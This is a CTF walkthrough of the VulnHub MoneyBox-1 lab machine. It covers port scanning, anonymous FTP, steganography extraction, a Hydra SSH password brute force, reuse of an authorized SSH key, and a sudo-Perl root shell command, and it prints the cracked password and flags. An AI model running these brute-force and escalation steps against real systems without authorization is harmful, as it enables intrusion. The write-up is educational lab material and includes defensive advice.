# MoneyBox CTF Walkthrough

> A comprehensive penetration testing and privilege escalation challenge demonstrating reconnaissance, steganography, credential cracking, and Linux privilege escalation techniques.

## Table of Contents

- [Project Overview](#project-overview)
- [Challenge Details](#challenge-details)
- [Setup & Reconnaissance](#setup--reconnaissance)
- [Solution Walkthrough](#solution-walkthrough)
- [Flags Captured](#flags-captured)
- [Key Techniques & Tools](#key-techniques--tools)
- [Learning Outcomes](#learning-outcomes)
- [Credits](#credits)

---

## Project Overview

**MoneyBox** is a vulnerable Linux-based CTF challenge from VulnHub designed to teach penetration testers real-world attack methodologies. This walkthrough documents the complete exploitation path from initial reconnaissance to full root compromise.

### Challenge Objectives

- Identify running services and enumerate open ports
- Discover hidden web directories and extract steganographic data
- Crack user credentials using dictionary attacks
- Escalate privileges to root access
- Capture all flags

### Target Machine Details

- **Platform**: VulnHub
- **Machine**: MoneyBox-1
- **OS**: Debian 10 (Linux 4.19)
- **Difficulty**: Beginner to Intermediate

---

## Challenge Details

### Services & Ports Discovered

The target machine exposes three primary services:

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 21   | FTP     | vsftpd 3.0.3 | Open (Anonymous login allowed) |
| 22   | SSH     | OpenSSH 7.9p1 | Open |
| 80   | HTTP    | Apache 2.4.38 | Open |

### Initial Reconnaissance Strategy

The challenge unfolds in multiple phases:

1. **Network Discovery** - Locate the target on the local network
2. **Service Enumeration** - Scan ports and identify running services
3. **Web Enumeration** - Discover hidden directories and extract hints
4. **Data Extraction** - Retrieve and decode steganographic data
5. **Credential Cracking** - Brute-force SSH credentials
6. **User Access** - Gain foothold as a low-privilege user
7. **Privilege Escalation** - Exploit sudo permissions to gain root
8. **Flag Capture** - Retrieve all flags from user and root directories

---

## Setup & Reconnaissance

### Step 1: Network Discovery

First, identify the target machine's IP address using ARP discovery:

![Netdiscover Output - Identifying Target IP](01-netdiscover-target-discovery.png)

**Command Used:**
```bash
netdiscover
```

**Key Finding:** Target is located at **192.168.1.29**

### Step 2: Port Scanning & Service Enumeration

Perform a comprehensive port scan to identify running services:

![Nmap Full Port Scan Results](02-nmap-port-scan.png)

**Command Used:**
```bash
nmap -A -p- 192.168.1.29
```

**Critical Findings:**
- FTP service allows anonymous login
- SSH is accessible on port 22
- Apache web server running on port 80
- Initial file discovered: `trytofind.jpg` on FTP server (1.06 MiB)

### Step 3: Web Application Analysis

Navigate to the web server and discover the landing page:

![MoneyBox Homepage](03-moneybox-homepage.png)

The homepage displays a message from "I'm T0m-H4ck3r" indicating this box was previously hacked and hints toward finding additional directories.

### Step 4: Hidden Directory Discovery

Use DIRB to enumerate web directories:

![DIRB Web Directory Enumeration](04-dirb-directory-enumeration.png)

**Command Used:**
```bash
dirb http://192.168.1.29/
```

**Directories Found:**
- `/blogs/` - Initially empty, contains hint comment
- `/index.html` - Homepage

**Critical Hint Discovered:** HTML source code comment reveals: `S3cr3t-T3xt` as a secret directory name.

---

## Solution Walkthrough

### Phase 1: Steganography & Data Extraction

#### 1.1 Retrieve File from FTP

Connect to FTP with anonymous credentials:

![FTP Connection and File Retrieval](06-ftp-file-retrieval.png)

**Commands:**
```bash
ftp 192.168.1.29
# Login as "Anonymous" with no password
get trytofind.jpg
exit
```

The file `trytofind.jpg` (1.06 MiB) contains embedded data using steganography.

#### 1.2 Extract Steganographic Data

Use StegSeek to identify the steganography seed:

![StegSeek Steganography Detection](07-stegseek-detection.png)

**Command:**
```bash
stegseek --seed trytofind.jpg
```

**Output:** Found seed `22f61b09` with embedded file `data.txt`

Extract the hidden data using Steghide:

![Steghide Data Extraction](08-steghide-extraction.png)

**Command:**
```bash
steghide --extract -sf trytofind.jpg
```

#### 1.3 Analyze Extracted Data

![Extracted Steganographic Message](09-extracted-data-message.png)

**Extracted Content:**
```
Hello.....  renu

I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

**Critical Information Obtained:**
- Username: **renu**
- Warning: Password is weak and should be changed

### Phase 2: Credential Cracking

#### 2.1 Brute Force SSH Password

Use Hydra to crack the SSH password for user "renu":

![Hydra SSH Brute Force Attack](10-hydra-ssh-bruteforce.png)

**Command:**
```bash
hydra -l renu -P /usr/share/wordlists/rockyou.txt.gz 192.168.1.29 ssh
```

**Result:**
- **Username:** renu
- **Password:** 987654321
- **Time:** 22 seconds to crack

### Phase 3: User Access & Enumeration

#### 3.1 Establish SSH Connection

![SSH Login as renu User](11-ssh-login-user1-flag.png)

**Command:**
```bash
ssh renu@192.168.1.29
# Password: 987654321
```

#### 3.2 Capture User1 Flag

After logging in, locate the first flag:

![User1 Flag Captured](Screenshot_2026-07-21_230042.png)

**Command:**
```bash
cat user1.txt
```

**Flag 1:**
```
us3r1{F14g:0ku74tbd3777y4}
```

#### 3.3 Enumerate Other Users

Explore the system to find additional users:

![Exploring /home Directory for Other Users](13-ssh-authorized-keys.png)

**Commands:**
```bash
cd /home
ls
cd lily
ls -ltra
cat user2.txt
```

**Flag 2:**
```
us3r{F14g:tr5827r5wu6nklao}
```

### Phase 4: Privilege Escalation

#### 4.1 SSH Key Exploitation

Examine the SSH directory of user "lily":

![Authorized Keys Access](14-authorized-keys-file.png)

The authorized_keys file contains the public key for user "renu", allowing SSH access as "lily" without requiring a password.

#### 4.2 Switch to lily User

**Command:**
```bash
ssh lily@127.0.0.1
```

#### 4.3 Check Sudo Permissions

Determine what commands "lily" can run with elevated privileges:

![Sudo Permissions for lily User](15-sudo-permissions-perl.png)

**Command:**
```bash
sudo -l
```

**Critical Finding:**
```
User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

The user "lily" can run Perl without a password as root—a dangerous privilege that enables immediate root access.

#### 4.4 Exploit Perl for Root Shell

Leverage Perl to execute a shell with root privileges:

![Perl Privilege Escalation to Root](16-perl-privilege-escalation.png)

**Exploit Command:**
```bash
sudo perl -e 'exec "/bin/sh";'
```

This command uses Perl's `exec` function to spawn a shell with root privileges, completely bypassing authentication.

**Verification:**
```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### Phase 5: Root Access & Final Flag

#### 5.1 Navigate to Root Directory

After escalating to root, navigate to the root home directory to find the final flag:

**Commands:**
```bash
cd /root
ls -ltra
cat .root.txt
```

#### 5.2 Capture Root Flag

**Flag 3 (Root):**
```
r00t{H4ckth3p14n3t}
```

**Complete Output:**
```
Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____
```

---

## Flags Captured

| Flag | Value | Difficulty |
|------|-------|------------|
| **User1** | `us3r1{F14g:0ku74tbd3777y4}` | ⭐⭐ Easy |
| **User2** | `us3r{F14g:tr5827r5wu6nklao}` | ⭐⭐ Easy |
| **Root** | `r00t{H4ckth3p14n3t}` | ⭐⭐ Easy |

---

## Key Techniques & Tools

### Reconnaissance & Enumeration

| Tool | Purpose | Command |
|------|---------|---------|
| **netdiscover** | Network ARP discovery | `netdiscover` |
| **nmap** | Port scanning & OS detection | `nmap -A -p- [target]` |
| **dirb** | Web directory enumeration | `dirb http://[target]/` |
| **ftp** | FTP file transfer | `ftp [target]` |

### Steganography & Data Extraction

| Tool | Purpose | Command |
|------|---------|---------|
| **stegseek** | Steganography analysis | `stegseek --seed [file]` |
| **steghide** | Steganography extraction | `steghide --extract -sf [file]` |

### Credential Cracking

| Tool | Purpose | Command |
|------|---------|---------|
| **hydra** | Password brute-force | `hydra -l [user] -P [wordlist] [target] ssh` |

### Privilege Escalation

| Technique | Method | Severity |
|-----------|--------|----------|
| **SSH Key Abuse** | Use renu's public key for lily access | High |
| **Sudo Misconfiguration** | Perl execution without password | **Critical** |
| **Perl Exec** | Use `perl -e 'exec "/bin/sh"'` for shell elevation | **Critical** |

### Wordlists & Dictionaries

- **rockyou.txt** - 14+ million password combinations
- Standard DIRB wordlist - 4,612 directory names

---

## Learning Outcomes

### Security Vulnerabilities Demonstrated

1. **Anonymous FTP Access** - Exposed sensitive files without authentication
2. **Steganographic Data Leakage** - Sensitive information hidden in images
3. **Weak Credentials** - Simple passwords vulnerable to dictionary attacks
4. **SSH Key Reuse** - Public keys in multiple user directories
5. **Dangerous Sudo Permissions** - Perl execution without password
6. **Privilege Escalation Chain** - Multiple paths to root access

### Defensive Measures

- **Disable Anonymous FTP** - Restrict file access with authentication
- **Secure Steganographic Data** - Use encryption for sensitive information
- **Enforce Strong Passwords** - Implement password complexity requirements
- **Restrict Sudo Commands** - Limit to essential administrative tools only
- **Audit SSH Keys** - Remove unnecessary authorized keys regularly
- **Monitor Privilege Escalation** - Alert on suspicious sudo usage

### Techniques Learned

✓ Network reconnaissance and active scanning  
✓ Steganography detection and data extraction  
✓ Dictionary-based password cracking  
✓ SSH exploitation and lateral movement  
✓ Sudo permission enumeration  
✓ Perl-based privilege escalation  
✓ Post-exploitation flag capture  

---

## Challenge Summary

| Phase | Task | Time | Status |
|-------|------|------|--------|
| **Reconnaissance** | Network discovery & enumeration | ~5 min | ✅ Complete |
| **Web Enumeration** | Directory discovery & hint extraction | ~2 min | ✅ Complete |
| **Steganography** | Data extraction from image | ~3 min | ✅ Complete |
| **Credential Cracking** | SSH password brute-force | ~1 min | ✅ Complete |
| **User Access** | SSH login & flag capture | ~2 min | ✅ Complete |
| **Privilege Escalation** | Sudo abuse & root shell | ~2 min | ✅ Complete |
| **Root Access** | Final flag capture | ~1 min | ✅ Complete |
| **Total** | Full compromise & exploitation | **~16 min** | ✅ **Success** |

---

## References & Resources

### Official Documentation
- [VulnHub - MoneyBox-1](https://www.vulnhub.com/entry/moneybox-1,653/)
- [Nmap Official Guide](https://nmap.org/)
- [Steghide Documentation](http://steghide.sourceforge.net/)
- [Hydra Github Repository](https://github.com/vanhauser-thc/thc-hydra)

### Related CTF Concepts
- Linux Privilege Escalation (GTFOBins - Perl)
- Steganography in Cybersecurity
- SSH Key Management Best Practices
- Sudo Misconfiguration Exploitation

### Recommended Tools for Similar Challenges
- **LinPEAS** - Linux privilege escalation suggestions
- **WinPEAS** - Windows privilege escalation suggestions
- **GTFOBins** - Unix binaries exploitation database
- **Searchsploit** - Exploit database search tool

---

## Credits

**Challenge Creator:** Kirthik-KarvendhanT  
- Instagram: @____kirthik____  
- Created: February 2021  
- Platform: VulnHub

**This Walkthrough Demonstrates:**
- Complete exploitation methodology
- Real-world attack chains
- Post-exploitation techniques
- Flag capture workflow

---

## Disclaimer

This CTF walkthrough is for **educational purposes only**. All techniques demonstrated are applied against intentionally vulnerable systems in a controlled lab environment. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.

---

**Last Updated:** July 21, 2026  
**Difficulty Rating:** ⭐⭐ Beginner to Intermediate  
**Total Time to Complete:** ~16 minutes

